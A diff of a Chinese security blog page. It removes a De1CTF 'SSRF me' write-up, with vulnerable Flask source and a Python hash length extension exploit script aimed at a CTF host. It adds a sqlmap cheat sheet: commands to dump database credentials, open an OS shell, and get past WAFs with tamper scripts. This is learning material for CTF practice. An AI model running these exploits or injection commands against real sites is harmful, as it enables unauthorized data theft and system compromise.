@@ -6,27 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>SSRF_me | Welcome to Tristan&#39;s Blog!</title>
+  <title>sqlmap | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="知识点1、哈希长度拓展攻击（hash_dump工具）2、字符串拼接利用3、Flask框架代码审计 De1CTF-SSRF me进入页面就可以发现源码：（因为第一次接触Flask框架，就写的稍微详细一点） #! &#x2F;usr&#x2F;bin&#x2F;env python #encoding&#x3D;utf-8 from flask import Flask from flask import request import so">
+  <meta name="description" content="Sqlmap 常用命令最近在准备面试…越看越觉得知识面不够…索性脚踏实地的慢慢来吧..技术这东西不能心急。于是简单总结一下平常常用的sqlmap命令Sqlmap,众所周知是sql注入神器，功能强大，避免了手注的繁琐，实现自动化注入。sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSRF_me">
-<meta property="og:url" content="http://yoursite.com/2020/04/10/SSRF-me/index.html">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://yoursite.com/2020/04/15/sqlmap/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="知识点1、哈希长度拓展攻击（hash_dump工具）2、字符串拼接利用3、Flask框架代码审计 De1CTF-SSRF me进入页面就可以发现源码：（因为第一次接触Flask框架，就写的稍微详细一点） #! &#x2F;usr&#x2F;bin&#x2F;env python #encoding&#x3D;utf-8 from flask import Flask from flask import request import so">
+<meta property="og:description" content="Sqlmap 常用命令最近在准备面试…越看越觉得知识面不够…索性脚踏实地的慢慢来吧..技术这东西不能心急。于是简单总结一下平常常用的sqlmap命令Sqlmap,众所周知是sql注入神器，功能强大，避免了手注的繁琐，实现自动化注入。sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/24.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/25.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/26.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/27.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/28.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/10/images/29.jpg">
-<meta property="article:published_time" content="2020-04-10T12:41:28.000Z">
-<meta property="article:modified_time" content="2020-04-10T14:01:42.812Z">
+<meta property="og:image" content="http://yoursite.com/2020/04/15/images/30.jpg">
+<meta property="article:published_time" content="2020-04-15T09:05:04.000Z">
+<meta property="article:modified_time" content="2020-04-15T10:04:09.039Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="代码审计，hash_dump">
+<meta property="article:tag" content="sqlmap">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/04/10/images/24.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/15/images/30.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -144,145 +139,35 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-SSRF-me" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sqlmap" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      SSRF_me
+      sqlmap
     </h1>
   
 
         
-        <a href="/2020/04/10/SSRF-me/" class="archive-article-date">
-  	<time datetime="2020-04-10T12:41:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-10</time>
+        <a href="/2020/04/15/sqlmap/" class="archive-article-date">
+  	<time datetime="2020-04-15T09:05:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1、哈希长度拓展攻击（hash_dump工具）<br>2、字符串拼接利用<br>3、Flask框架代码审计</p>
-<h4 id="De1CTF-SSRF-me"><a href="#De1CTF-SSRF-me" class="headerlink" title="De1CTF-SSRF me"></a>De1CTF-SSRF me</h4><p>进入页面就可以发现源码：（因为第一次接触Flask框架，就写的稍微详细一点）</p>
-<pre><code>#! /usr/bin/env python
-#encoding=utf-8
-from flask import Flask
-from flask import request
-import socket
-import hashlib
-import urllib
-import sys
-import os
-import json
-
-reload(sys)
-sys.setdefaultencoding(&apos;latin1&apos;) //设置默认字体
-
-app = Flask(__name__) //创建一个Flask实例app客户端（一般是浏览器）将请求发送给服务端Web服务器，Web服务器再把请求发给Flask实例。
-
-secert_key = os.urandom(16)//随机生成16Byte密钥，是这次MD5拓展攻击成功的一个因素
-
-class Task:
-def __init__(self, action, param, sign, ip):
-    self.action = action
-    self.param = param
-    self.sign = sign
-    self.sandbox = md5(ip)
-    if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
-        os.mkdir(self.sandbox)
-
-def Exec(self):
-    result = {}
-    result[&apos;code&apos;] = 500
-    if (self.checkSign()):
-        if &quot;scan&quot; in self.action://如果是“scan”动作，就将扫描结果写入文件中
-            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
-            resp = scan(self.param)
-            if (resp == &quot;Connection Timeout&quot;):
-                result[&apos;data&apos;] = resp
-            else:
-                print(resp)
-                tmpfile.write(resp)
-                tmpfile.close()
-            result[&apos;code&apos;] = 200
-        if &quot;read&quot; in self.action://如果是“read”操作，就将文件内容以Json格式返回给浏览器
-            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
-            result[&apos;code&apos;] = 200
-            result[&apos;data&apos;] = f.read()
-        if result[&apos;code&apos;] == 500:
-            result[&apos;data&apos;] = &quot;Action Error&quot;
-    else:
-        result[&apos;code&apos;] = 500
-        result[&apos;msg&apos;] = &quot;Sign Error&quot;
-    return result
-
-def checkSign(self)://验证签名是否一致
-    if (getSign(self.action, self.param) == self.sign):
-        return True
-    else:
-        return False
-#generate Sign For Action Scan.
-@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])  //如果是访问/geneSign，则返回“(secret_key+param+scan)”的加密结果
-def geneSign():
-param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-action = &quot;scan&quot;
-return getSign(action, param)
-
-@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;]) 
-def challenge():
-action = urllib.unquote(request.cookies.get(&quot;action&quot;))
-param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
-ip = request.remote_addr
-if(waf(param)): //不能使用gopher、data协议
-    return &quot;No Hacker!!!!&quot;
-task = Task(action, param, sign, ip)
-return json.dumps(task.Exec())
-@app.route(&apos;/&apos;)
-def index(): //显示主页面源码
-return open(&quot;code.txt&quot;,&quot;r&quot;).read()
-
-def scan(param):
-   socket.setdefaulttimeout(1)
-   try:
-      return urllib.urlopen(param).read()[:50]
-   except:
-      return &quot;Connection Timeout&quot;
-
-def getSign(action, param): //加密签名操作
-     return hashlib.md5(secert_key + param + action).hexdigest()
-
-def md5(content):
-      return hashlib.md5(content).hexdigest()
-
-def waf(param):
-check=param.strip().lower()
-if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
-    return True
-else:
-    return False
-
-if __name__ == &apos;__main__&apos;:
-app.debug = False
-app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h4 id="首先开始审计代码，发现总共有三个页面："><a href="#首先开始审计代码，发现总共有三个页面：" class="headerlink" title="首先开始审计代码，发现总共有三个页面："></a>首先开始审计代码，发现总共有三个页面：</h4><p>（1）主页面/index.php 用来显示源码，没什么特殊的地方<br>（2）/De1ta，接受action,param，sign三个参数；<br>（3）/geneSign 返回（secret_key+param+scan)MD5加密值<br>题目提示我们flag在flag.txt里；猜测应该就是利用exec函数想办法读到flag.txt里的内容。来审计一下exec()：<br><img src="../images/24.jpg" alt="2"><br>其中scan模式，是将param参数文件的内容写入/sandbox/result.txt中<br>read模式，则是将/sandbox/result.txt的内容读出来；<br>那这时就可以考虑先将flag.txt的内容写入result.txt中，然后使用read模式将result.txt读出来，flag.txt内容自然也就出来了；那对于参数”action”就得包含”read”和”scan”;<br>但前提是CheckSign()为True；跟进CheckSign():<br>要求Getsign(self.action, self.param)==self.sign<br><img src="../images/25.jpg" alt="3"><br>再跟进Getsign()函数：<br>发现是对（secr_key+param+action)MD5加密；<br><img src="../images/26.jpg" alt="4"><br>现在的问题就是使得MD5加密后的值要与我们提交的Sign参数相等；但我们并不清楚secret_key的值，无法构造sign；这时注意/geneSign页面，发现返回一个md5值，但却是对(secret_key+param+scan)加密；我们的目标是要构造(secret_key+param+readscan),然后将值赋给参数”sign”;</p>
-<h4 id="解法一：巧妙利用字符串拼接"><a href="#解法一：巧妙利用字符串拼接" class="headerlink" title="解法一：巧妙利用字符串拼接"></a>解法一：巧妙利用字符串拼接</h4><p>重新观察getsign()，发现他是通过”+”将三个变量组成字符串，即对（”secret_keyparamaction”)加密；而/geneSign的结果是对（”secret_keyparamscan”)加密生成的，因为这里scan是固定死的，无从下手，但可以通过param变量将”read”添加进去，即param=flag.txtread;则返回的结果是对（”secret_keyflag.txtreadscan”)加密结果；也就生成了我们需要的sign值；<br><img src="../images/27.jpg" alt="5"><br>此时再构造payload，拿到flag：<br><img src="../images/28.jpg" alt="6"></p>
-<h4 id="解法二：哈希长度拓展攻击"><a href="#解法二：哈希长度拓展攻击" class="headerlink" title="解法二：哈希长度拓展攻击"></a>解法二：哈希长度拓展攻击</h4><p>详细情况，请参考：<a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">https://joychou.org/web/hash-length-extension-attack.html</a><br>我简要概括一下：当已知以下三点</p>
-<pre><code>1、md5(salt+message)的值
-2、message内容
-3、salt+message长度</code></pre><p>我们可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值<br>比如就这道题而言，我们已经知道salt为16字节，而flag.txt为8字节<br>所以(salt+message)为24字节；而数据为scan;想要扩展的内容为read；<br>所以使用hash_Pump工具，生成加密值：<br><img src="../images/29.jpg" alt="7"><br>payload:</p>
-<pre><code>import requests
-
-url = &apos;http://33e7e4ef-eaf5-46ac-9523-c0c7dab3c41f.node3.buuoj.cn/De1ta?param=flag.txt&apos;
-
-cookies = {
-&apos;sign&apos;: &apos;42c217eb3287c266c686501944d4ff2d&apos;,
-&apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,
-}
-
-res = requests.get(url=url, cookies=cookies)
-print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题主要学习了Flask框架的代码审计，哈希拓展攻击，以及巧妙利用字符串拼接，生成我们想要的sign值；</p>
+        <h3 id="Sqlmap-常用命令"><a href="#Sqlmap-常用命令" class="headerlink" title="Sqlmap 常用命令"></a>Sqlmap 常用命令</h3><p>最近在准备面试…越看越觉得知识面不够…索性脚踏实地的慢慢来吧..技术这东西不能心急。于是简单总结一下平常常用的sqlmap命令<br>Sqlmap,众所周知是sql注入神器，功能强大，避免了手注的繁琐，实现自动化注入。<br>sqlmap支持五种不同的注入模式：</p>
+<pre><code>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+4、联合查询注入，可以使用union的情况下的注入。
+5、堆查询注入，可以同时执行多条语句的执行时的注入。</code></pre><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>1、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a><br>参数：-u：指定注入点url；默认使用level1检测全部数据库类型<br>2、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> –dbms mysql –dbs<br>–dbs 爆出所有库名 –dbms 指定当前库类型<br>3、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test –tables<br>–tables 爆出test库中的所有表名<br>4、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test -T test1 –columns<br>–columns 爆出test1表中的所有列名<br>5、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test -T test1 -C “username,password” –dump<br>–dump 将username,password内容拖下来<br>6、对于POST型sql注入，可以使用burpsuite抓包，将整个数据保存到文件中。再使用sqlmap：<br>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql<br>-p 指定注入参数<br>7、对于cookie注入<br>sqlmap -u “<a href="http://www.xxx.com/1.asp&quot;" target="_blank" rel="noopener">http://www.xxx.com/1.asp&quot;</a> –cookie “id=11” –level 2（只有level达到2才会检测cookie）level1-5，等级越高，检测越全面，当然牺牲时间就越长</p>
+<h3 id="其他sqlmap常用命令"><a href="#其他sqlmap常用命令" class="headerlink" title="其他sqlmap常用命令"></a>其他sqlmap常用命令</h3><p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–os-shell 交互式的操作系统的shell</p>
+<h3 id="sqlmap-使用脚本注入–tamper"><a href="#sqlmap-使用脚本注入–tamper" class="headerlink" title="sqlmap 使用脚本注入–tamper"></a>sqlmap 使用脚本注入–tamper</h3><p>sqlmap作为一款功能强大的注入工具，面对waf，自然也提供了一些脚本进行绕过；下面简单介绍几个，更多脚本可在/usr/share/golismero/tools/sqlmap/tamper查看<br><img src="../images/30.jpg" alt="1"><br>1、base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==<br>2、apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871<br>3、space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
+<p>后期的目标是，自己能够尝试编写一些绕过脚本；</p>
 
       
 
@@ -296,7 +181,7 @@ print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink"
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计，hash_dump</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
         		</li>
       		
 		</ul>
@@ -352,7 +237,7 @@ print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink"
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/10/SSRF-me/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/15/sqlmap/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -366,18 +251,18 @@ print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink"
   
 <nav id="article-nav">
   
-    <a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/04/15/Burpsuite/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          phpmyadmin4.8.1 任意文件包含漏洞
+          Burpsuite
         
       </div>
     </a>
   
   
-    <a href="/2020/04/07/Fakebook/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Fakebook</div>
+    <a href="/2020/04/11/Online-tool/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Online-tool</div>
       <i class="icon-circle-right"></i>
     </a>
   
